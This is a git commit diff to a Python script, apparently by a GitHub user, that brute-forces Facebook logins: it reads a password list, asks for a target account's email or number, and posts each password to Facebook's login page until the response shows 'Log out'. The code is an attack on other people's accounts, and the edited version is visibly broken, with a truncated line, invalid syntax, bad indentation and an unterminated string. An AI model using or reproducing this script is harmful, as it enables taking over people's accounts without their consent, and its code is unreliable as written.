c469fef1fccf2f18de3199aa6a541ecf7a83de11
nerdhacker000 <114361549+nerdhacker000@users.noreply.github.com>
2022-09-28 09:23:38 +0000

    Update 1.py

--- 1.py
+++ 1.py
@@ -5,25 +5,20 @@ ID_PASSWORD = "pass"
 FB_URL = 'http://facebook.com/login.php'
 
 def try_password():
-    payload = {ID_USERNAME : email, ID_PASSWORD : password}
+	payload = {ID_USERNAME : email, ID_PASSWORD : passwor>
+	resp = requests.get(FB_URL)
+	resp = requests.post(FB_URL, payload)
+	if 'Log out' in resp.text:
+	print("password is found")
 
-    resp = requests.get(FB_URL)
-    print("Response to GET request: %s" %resp.content)
-
-    resp = requests.post(SIGNUP_URL, payload)
-    print "Found password"
-
-PASSWORD_FILE="password.txt"
+PASSWORD_FILE="passwords.txt"
 password= open(PASSWORD_FILE, 'r').read().split("\n")
 print("Password file selected: ", PASSWORD_FILE)
 email = input('Target account Email/Number: ').strip()
 
-for index, password in zip(range(password_data.__len__()), password_data):
+if __name__="main":
+	for index, password in zip(range(password.__len__()), password):
 	password = password.strip()
-	if len(password) < MIN_PASSWORD_LENGTH:
+		if len(password) < 6:
 		continue
-		print("Trying password index[", index, "]" )
-
-	if __name__ == '__main__':
-		if try_password():
-			break
+                print("Trying password index[", index,"])
